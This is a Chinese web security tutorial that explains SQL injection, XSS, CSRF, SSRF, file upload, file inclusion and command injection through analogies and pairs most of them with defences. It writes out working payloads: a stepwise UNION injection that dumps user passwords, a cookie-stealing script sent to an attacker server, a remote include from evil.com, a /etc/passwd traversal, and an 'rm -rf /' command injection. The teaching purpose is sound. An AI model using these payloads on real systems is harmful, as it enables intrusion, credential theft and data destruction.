## 1. Web安全全景图

### 🏢 生活类比：银行柜台

```
Web应用 = 银行柜台

  用户（浏览器）←→ 柜员窗口（Web服务器）←→ 金库（数据库）

所有Web安全漏洞的本质：
    攻击者让柜员做了不该做的事
    或者绕过了柜员的验证直接进金库
```

### OWASP Top 10（2021版）——十大Web安全风险

```
A01: 访问控制失效    —— 没登录也能看别人的东西
A02: 加密机制失效    —— 密码明文存、弱加密
A03: 注入(Injection) —— ★SQL注入等，把恶意命令混在输入里
A04: 不安全的设计    —— 架构本身有问题
A05: 安全配置错误    —— 默认密码没改、debug模式没关
A06: 使用有漏洞的组件 —— 旧版本框架/库的已知漏洞
A07: 认证失效        —— 能猜到密码、能绕过登录
A08: 软件和数据完整性失效 —— 没检查下载的更新是不是正版
A09: 日志和监控失效  —— 被攻破了不知道
A10: SSRF           —— 让服务器替你去访问内部系统
```

**本文重点讲 A03（注入类）是最常见的攻击类型。**

## 2. 📌 SQL注入——数据库的噩梦

### 🏢 生活类比：填表把命令写进去了

```
银行的取款单：
  ┌─────────────────┐
  │ 姓名: __________│
  │ 账号: __________│
  │ 金额: __________│
  └─────────────────┘

正常填写：取自己的钱
恶意填写：在"姓名"一栏写 "'; 把所有人的钱转给我; --"
  
如果银行后台直接把你的填写内容拼进SQL语句，不检查的话……
```

### 原理图示

```
正常登录流程：
  URL: /login?user=admin&pass=123456
  后端拼出的SQL:
    SELECT * FROM users WHERE username='admin' AND password='123456'
  结果: 找到匹配的用户 → 登录成功

SQL注入登录：
  URL: /login?user=admin'--&pass=xxx
  后端拼出的SQL:
    SELECT * FROM users WHERE username='admin'--' AND password='xxx'
                                          ↑
                                     -- 是SQL注释符！
                                    后面全被注释掉了！
  实际执行的SQL:
    SELECT * FROM users WHERE username='admin'
  结果: 不需要密码，直接以admin身份登录！
```

### 注入分类

```
┌────────────────────────────────────┐
│            SQL 注入分类              │
├────────────────────────────────────┤
│                                    │
│  有回显的（能看到结果）：              │
│   ├── 联合查询注入(UNION SELECT)    │
│   │   把攻击者想要的查询结果"并"在正常结果后面  │
│   │                                │
│   └── 报错注入                     │
│       利用数据库报错信息泄露数据       │
│                                    │
│  无回显的（盲注）：                   │
│   ├── 布尔盲注                     │
│   │   看页面True/False来推断        │
│   │                                │
│   └── 时间盲注                     │
│       看页面延迟时间来判断           │
│                                    │
└────────────────────────────────────┘
```

### 💻 实战：联合查询注入（有回显）

```
目标 URL: http://target.com/product.php?id=1

步骤1: 判断是否存在注入
  /product.php?id=1'          → 页面报错/异常
  /product.php?id=1'--        → 页面恢复正常
  → 存在注入！

步骤2: 判断列数（用 ORDER BY 二分法试）
  /product.php?id=1' order by 3--   → 正常
  /product.php?id=1' order by 4--   → 报错
  → 原查询有 3 列

步骤3: 判断哪些列会显示在页面上
  /product.php?id=-1' union select 1,2,3--
  页面显示了数字 2 和 3 → 第2列和第3列有回显

步骤4: 利用回显位获取数据
  /product.php?id=-1' union select 1,database(),user()--
  → 显示了数据库名和用户名

步骤5: 查表名
  /product.php?id=-1' union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),3--

步骤6: 查列名
  /product.php?id=-1' union select 1,(select group_concat(column_name) from information_schema.columns where table_name='users'),3--

步骤7: 拖数据
  /product.php?id=-1' union select 1,(select group_concat(username,':',password) from users),3--
  → 拿到所有用户名和密码！
```

### 🛡️ 防御方法

```
根本防御: 参数化查询（Prepared Statement）

错误做法（拼接字符串）:
  query = "SELECT * FROM users WHERE id=" + user_input

正确做法（参数化）:
  query = "SELECT * FROM users WHERE id=?"
  stmt.execute(user_input)    # user_input 被当做"值"而非"SQL代码"

其他防御层:
  → 输入白名单验证（只接受预期范围内的字符）
  → 最小权限原则（数据库用户只给必要的权限）
  → WAF（Web应用防火墙）
```

## 3. 📌 XSS跨站脚本——浏览器的漏洞

### 🏢 生活类比：公告栏上贴假通知

```
反射型XSS = 在公告栏上偷偷贴了张"扫码领红包"
  → 别人看到公告栏上的内容
  → 扫码中招
  → 执行了攻击者写的恶意代码

存储型XSS = 攻击者把恶意通知托人贴进了"官方公告"里
  → 每个来看官方公告的人都中招
  → 最危险
```

### 三种XSS对比

```
┌──────────┬──────────────┬──────────────┬──────────────┐
│   类型   │  代码在哪？   │  影响范围     │  生活类比     │
├──────────┼──────────────┼──────────────┼──────────────┤
│ 反射型   │ 藏在URL参数里  │ 单个受害者    │ 钓鱼链接       │
│ 存储型   │ 存在服务器DB里 │ 所有访问者    │ 公告栏贴假告示  │
│ DOM型    │ 纯前端处理漏洞 │ 单个受害者    │ 前台服务员被收买│
└──────────┴──────────────┴──────────────┴──────────────┘
```

### 💻 反射型XSS实战

```
目标搜索框可能存在XSS漏洞

正常输入:
  搜索"手机" → 页面显示"搜索'手机'的结果:"

恶意输入:
  <script>alert('XSS')</script>
  
如果页面把这段代码直接输出：
  "搜索'<script>alert('XSS')</script>'的结果:"
  → 浏览器解析 HTML 时看到 <script> 标签
  → 执行了里面的 JavaScript！
  → 弹窗！

进阶利用（盗取Cookie）:
  <script>
    new Image().src = 'http://攻击者服务器/steal.php?cookie=' + document.cookie;
  </script>
  → 受害者的Cookie被发给攻击者
  → 攻击者用Cookie冒充受害者登录
```

### 🛡️ 防御方法

```
1. 输出编码（核心防御）
   < → &lt;   > → &gt;   " → &quot;   ' → &#x27;
   浏览器看到 &lt;script&gt; 会当普通文字显示，不会当标签执行

2. CSP（内容安全策略）
   HTTP 响应头: Content-Security-Policy: script-src 'self'
   → 浏览器只执行本域的JS，不执行注入的恶意脚本

3. HttpOnly Cookie
   Set-Cookie: session=xxx; HttpOnly
   → Cookie 不能通过 document.cookie 读取
   → XSS 偷不走会话cookie
```

## 4. CSRF——冒用身份的攻击

### 🏢 生活类比

```
CSRF = 伪造委托书

场景:
  你登录了网上银行（Cookie有效）
  你打开了另一个网页（攻击者的钓鱼页面）
  攻击页面里藏了一个图片:
    <img src="http://银行.com/transfer?to=黑客&amount=10000" />
  浏览器看到图片标签，自动发起请求
  因为你银行的Cookie还在，请求被认为是"你发的"
  → 钱被转走了
```

### 💻 攻击原理

```
用户                   正常网站A                 恶意网站B
 │                        │                        │
 │──登录──→              │                        │
 │←─Cookie──            │                        │
 │                        │                        │
 │──────────────────────浏览──────────────────────→│
 │                        │                        │
 │                        │          ←─ 页面里有隐藏的表单提交到A
 │                        │                        │
 │──Cookie还在，发送请求──→│                        │
 │   (用户不知情)          │                        │
 │                        │                        │
 ← 银行以为用户真的要转账 → 钱没了！
```

### 🛡️ 防御方法

```
1. CSRF Token
   每次表单里放一个随机token，服务器验证
   攻击者的页面不知道这个token → 请求被拒绝

2. SameSite Cookie
   Set-Cookie: session=xxx; SameSite=Strict
   → 跨站请求不携带Cookie → CSRF失效

3. 验证 Referer/Origin 头
   检查请求来自哪个页面
   → 如果来自其他域名，拒绝
```

## 5. SSRF——服务端请求伪造

### 🏢 生活类比

```
SSRF = 你让快递员替你去金库取东西

  攻击者告诉服务器："帮我访问 http://127.0.0.1/admin"
  服务器想：127.0.0.1 是内网地址，我自己就是内网的，我能访问
  于是服务器去访问了内部管理系统
  然后把结果返回给了攻击者

→ 攻击者通过服务器这个"跳板"，访问到了外网访问不到的内网资源
```

### 🔥 常见攻击目标

```
1. 读取云服务器元数据（AWS/GCP/阿里云）
   http://169.254.169.254/latest/meta-data/
   → 可能泄露 AccessKey 等敏感凭证

2. 探测内网端口
   http://127.0.0.1:6379/  → Redis？
   http://127.0.0.1:3306/  → MySQL？
   http://127.0.0.1:22/    → SSH？

3. 利用内网未授权服务
   很多内网服务没有认证（"内网的，不设密码了"）
   SSRF 让外部攻击者也能访问这些"内网裸奔"的服务
```

## 6. 文件上传漏洞

### 🏢 生活类比

```
文件上传 = 门卫检查来客身份

  正常来访：出示工牌（白名单.jpg）→ 放行
  攻击者：掏出假工兵证（shell.php）→ 门卫只看了照片，放行
  结果：攻击者的"文件"实际是可执行代码，服务器上运行了
```

### 💻 绕过手段总结

```
服务器检查:    攻击者绕过:
──────────────────────────────────
前端JS校验     → 抓包改请求/禁用JS
检查文件后缀    → .pht .phtml .php5 → 服务器也能解析
检查MIME类型    → 改Content-Type头
检查文件头     → 在webshell前加 GIF89a 伪装图片
检查文件内容    → 难绕过，但可以试试编码/加密
```

### 🛡️ 防御

```
1. 白名单（不要用黑名单！）
   只允许: .jpg .png .pdf .docx
   禁止: "除了.php .jsp .asp 以外的" → 很容易漏

2. 重命名文件
   不要保留用户上传的文件名

3. 文件存在单独的静态服务器（没有执行权限）

4. 上传目录设置脚本执行权限为none
```

## 7. 文件包含漏洞（LFI/RFI）

### 💻 原理

```php
// 可怕的代码:
<?php
  $page = $_GET['page'];
  include($page . ".php");      // 用户输入直接放进 include！
?>
```

```
攻击:
  /index.php?page=../../../../etc/passwd
  → include("/etc/passwd.php")
  → PHP 尝试包含 /etc/passwd 并执行（虽然后缀不对，但文件内容被读出来了）

RFI（远程文件包含）:
  /index.php?page=http://evil.com/shell
  → 包含远程服务器的恶意PHP文件
  → 恶意代码在服务器上执行
```

## 8. 命令注入

### 🏢 生活类比

```
命令注入 = 在餐厅扫码点餐时，偷偷在"备注"里写
           "做这道菜，顺便把后门打开让我进来"

如果餐厅的后厨管理系统直接执行备注里的命令……
```

### 💻 原理

```python
# 可怕的代码
import os
filename = request.GET['file']
os.system("cat " + filename)    # 直接拼接执行！

# 正常输入: report.txt
# → cat report.txt  ✓ 正常

# 恶意输入: report.txt; rm -rf /
# → cat report.txt; rm -rf /  ✗ 先cat正常文件，然后删库！
#    ; 在shell中表示"执行完上一个，接着执行下一个"
```

### 常用注入字符

```
;    分号      → 执行完上一条，执行下一条
|    管道      → 前一个命令的输出作为后一个的输入
||   OR       → 前一个失败就执行后一个
&&   AND      → 前一个成功才执行后一个
`cmd` 反引号   → 先执行反引号里的命令，结果放这里
$(cmd)        → 同上
```
